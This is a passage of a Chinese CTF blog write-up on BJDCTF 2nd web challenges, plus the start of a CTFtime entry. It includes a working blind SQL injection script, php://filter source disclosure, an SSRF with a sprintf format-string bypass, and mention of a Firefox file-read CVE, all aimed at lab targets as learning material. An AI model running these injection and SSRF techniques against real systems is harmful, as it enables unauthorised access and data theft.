class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322185056.png" style="zoom: 67%;"><p>发现插入多条数据也可以这样用,但是有相似的话就会查出多条数据</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322193353.png" style="zoom: 67%;"><p>写了个exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b4b1391f-dea5-4d42-8e61-f68b27487be2.node3.buuoj.cn&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlin</span>(<span class="params">sql</span>):</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">f1=database</span><br><span class="line">top=<span class="number">127</span></span><br><span class="line">low=<span class="number">33</span></span><br><span class="line"><span class="keyword">while</span> low&lt;=top:</span><br><span class="line">mid=(top+low)//<span class="number">2</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) &gt; &#123;&#125;),1,0)#&#x27;</span>.format(sql,str(i),str(mid))</span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#&#x27;</span>.format(sql,str(i),str(mid))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r1=requests.post(url,data=data2)</span><br><span class="line">print(i,mid)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;BJD needs to be stronger&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">database+=chr(mid)</span><br><span class="line">print(database)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r=requests.post(url,data=data1)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;BJD needs to be stronger&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">low=mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;P3rh4ps&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">top=mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> database==f1:</span><br><span class="line">print(database)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># database=&#x27;p3rh4ps&#x27;</span></span><br><span class="line">sql0=<span class="string">&#x27;database()&#x27;</span></span><br><span class="line">sql1=<span class="string">&#x27;username&#x27;</span></span><br><span class="line">sqlin(sql1)</span><br></pre></td></tr></table></figure><h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>抓包，看到http头里有<code>hint:home.php</code></p><p>访问会跳转到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home.php?file=system</span><br></pre></td></tr></table></figure><p><code>php://filter</code>读源码，<code>system.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">home.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=system</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>]) || $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] !== sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;why you are here!&#x27;);alert(&#x27;fxck your scanner&#x27;);alert(&#x27;fxck you! get out!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str2 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line">$str3 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line">$str4 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">&#x27;/^http:\/\/127\.0\.0\.1\//i&#x27;</span>;</span><br><span class="line">$filter2 = <span class="string">&#x27;/.?f.?l.?a.?g.?/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;q1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q3&#x27;</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;.y1ng.txt&quot;</span>;</span><br><span class="line">    $method = $_POST[<span class="string">&#x27;q3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">&quot;~$ python fuck.py -u \&quot;&quot;</span>.$url .<span class="string">&quot;\&quot; -M <span class="subst">$method</span> -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^GET/i&#x27;</span>, $method) &amp;&amp; !preg_match(<span class="string">&#x27;/^POST/i&#x27;</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>home.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;禁止套娃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;现在访问的是 &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个<code>admin.php</code>，试着访问一下</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200323143502.png"></p><p>好像没啥思路了，再看下<code>system.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br></pre></td></tr></table></figure><p>和极客大挑战的某题很类似，我们只需在<code>$method</code>传<code>%s%</code>将<code>%d</code>转义就行，所以我们可以这样构造</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200323150943.png" style="zoom:80%;"><p>可以看到我们已经ssrf读取到admin.php了，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">&#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;</span>; <span class="comment">//fake</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>] === md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] === sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;爬&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看了看后面的随机数生成的代码，发现应该没有方法暴力破解出来</p><p>仔细看看，发现如果第一次我们设置了<code>decrypt</code>，<code>$_SESSION[&#39;secret&#39;]</code>就为空，即<code>$data</code>为空</p><p>而<code>Cheak()</code>函数是很好绕过的，所以我们可以构造:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5(<span class="string">&#x27;174.0.222.75&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">$cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $cipher;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200323160910.png"></p><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>题目有这两行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p hidden id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p><code>506F2E706870</code>十六进制转字符得到<code>Po.php</code>，我哭了。。。</p><p>Po是一个化学元素，刚好和题目的图相关，用化学元素跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27;, &#x27;</span>):</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://04302ff8-21bd-4bbb-86b9-401e9978d758.node3.buuoj.cn/&#123;&#125;.php&#x27;</span>.format(i))</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">        print(r.text,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>跑完得到<code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code>，访问得到flag</p><h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>抓包，发现post请求得时侯一直有set_cookie，并且前几位不变</p><p>base64解密得到纯数字，刚好是Unix时间戳，不懂，这样构造flag就在那个视频评论里</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200324174737.png"></p><p>参考：</p><p><a href="https://blog.csdn.net/IOT2017/article/details/84069882">https://blog.csdn.net/IOT2017/article/details/84069882</a></p><p><a href="https://segmentfault.com/a/1190000015886194?utm_source=tag-newest">https://segmentfault.com/a/1190000015886194?utm_source=tag-newest</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFtime做题记录</title>
      <link href="2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了自己闲来无事在ctf-time做题的记录！</p><a id="more"></a><h2 id="Confidence-CTF"><a href="#Confidence-CTF" class="headerlink" title="Confidence CTF"></a>Confidence CTF</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Cat-Web"><a href="#Cat-Web" class="headerlink" title="Cat Web"></a>Cat Web</h4><p>题目地址：<a href="http://catweb.zajebistyc.tf/">http://catweb.zajebistyc.tf/</a></p><p>查看源代码，发现可以找到flag的位置</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319190036.png" style="zoom:80%;"><p>源代码发现有report功能，尝试给个url发现会访问</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319190505.png" style="zoom:80%;"><p>Firefox/67.0这个信息给很重要，这题考察的就是FireFox的一个cve</p><p>CVE-2019-11730，POC地址：<a href="https://github.com/alidnf/CVE-2019-11730">https://github.com/alidnf/CVE-2019-11730</a></p><p>利用这个漏洞我们可以任意文件读取，先看下源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNewCats</span>(<span class="params">kind</span>) </span>&#123;</span><br><span class="line">$.getJSON(<span class="string">&#x27;http://catweb.zajebistyc.tf/cats?kind=&#x27;</span>+kind, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(data.status != <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">&#x27;#cats_container&#x27;</span>).empty();</span><br><span class="line">cats = data.content;</span><br><span class="line">cats.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">cat</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> newDiv = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">newDiv.innerHTML = <span class="string">&#x27;&lt;img style=&quot;max-width: 200px; max-height: 200px&quot; src=&quot;static/&#x27;</span>+kind+<span class="string">&#x27;/&#x27;</span>+cat+<span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">$(<span class="string">&#x27;#cats_container&#x27;</span>).append(newDiv);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$(<span class="string">&#x27;#cat_select&#x27;</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> kind = $(<span class="built_in">this</span>).val();</span><br><span class="line">history.pushState(&#123;&#125;, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>+kind)</span><br><span class="line">getNewCats(kind);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> kind = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">kind = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">getNewCats(kind);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当我们切换猫的颜色的时候就会像服务端发送请求获得图片的名称</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319215249.png" style="zoom:80%;"><p>如果我们搜索灰猫，则图像的路径为<code>static/grey/1.jpg</code>，因此kind（grey）是文件夹，所有我们前面的目录遍历才成立</p><p>当我们不设颜色参数时,就会截取?后面的东西作为kind，如果为空则kind为black，我们第一次打开就是black</p><figure 